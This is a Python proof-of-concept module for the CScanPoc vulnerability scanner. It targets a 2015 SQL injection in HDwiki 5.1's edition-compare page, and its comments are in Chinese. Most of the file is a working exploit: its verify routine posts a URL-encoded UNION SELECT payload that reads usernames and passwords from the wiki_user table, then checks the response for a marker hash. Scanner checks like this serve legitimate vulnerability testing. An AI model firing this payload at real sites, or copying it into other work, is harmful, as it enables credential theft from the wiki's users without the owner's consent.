# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'HDwiki_0001'  # 平台漏洞编号，留空
    name = 'HDwiki 5.1 /control/edition.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-02-25'  # 漏洞公布时间
    desc = '''
        HDwiki 5.1版本 /control/edition.php参数过滤不严谨导致的SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/2978/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'HDwiki'  # 漏洞应用名称
    product_version = '5.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8a7c8112-cefa-4231-8d0d-f12a6ec72480'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # payload其中的数值需要根据实际情况调整，否则会显示参数错误，具体怎么调整看代码，默认安装是这个POC
            verify_url = '%s/index.php?edition-compare-1' % self.target
            payload = ("eid[0]=2&eid[1]=19&eid[2]=-1%29%20UNION%20SELECT%201%2C2%2C35"
                       "%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cmd5%28233%29%2Cusername%2C"
                       "password%2C14%2C15%2C16%2C17%2C18%2C19%20from%20wiki_user%23")
            headers_fake = {'Host': urllib.parse.urlparse(
                self.target).netloc, 'DNT': 1, }

            req = urllib.request.Request(
                url=verify_url, data=payload, headers=headers_fake)
            content = urllib.request.urlopen(req).read()
            if 'e165421110ba03099a1c0393373c5b43' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
